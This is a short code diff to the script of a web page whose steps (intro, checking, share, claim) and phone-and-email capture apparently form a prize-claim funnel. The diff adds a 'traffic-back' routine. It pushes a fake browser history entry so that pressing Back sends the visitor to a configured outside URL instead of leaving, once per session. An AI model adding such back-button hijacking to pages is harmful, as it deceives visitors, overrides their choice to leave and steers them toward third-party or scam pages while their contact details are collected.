@@ -5,6 +5,16 @@
   const $=id=>document.getElementById(id);
   const show=id=>{['intro','loader','info','checking','share','claim'].forEach(x=>{const el=$(x);if(el)el.style.display=x===id?'block':'none'})};
 
+  // One-time traffic-back redirect. Set trafficBackUrl in assets/js/config.js.
+  const trafficBackKey='ann_traffic_back_used_v1';
+  if(C?.trafficBackUrl&&!sessionStorage.getItem(trafficBackKey)){
+    history.pushState({annTrafficBack:true},'',location.href);
+    window.addEventListener('popstate',()=>{
+      sessionStorage.setItem(trafficBackKey,'1');
+      window.location.replace(C.trafficBackUrl);
+    },{once:true});
+  }
+
   async function saveRegistration(phone,email){
     const cfg=C.supabase;
     if(!cfg?.url||!cfg?.key||!cfg?.table)return;
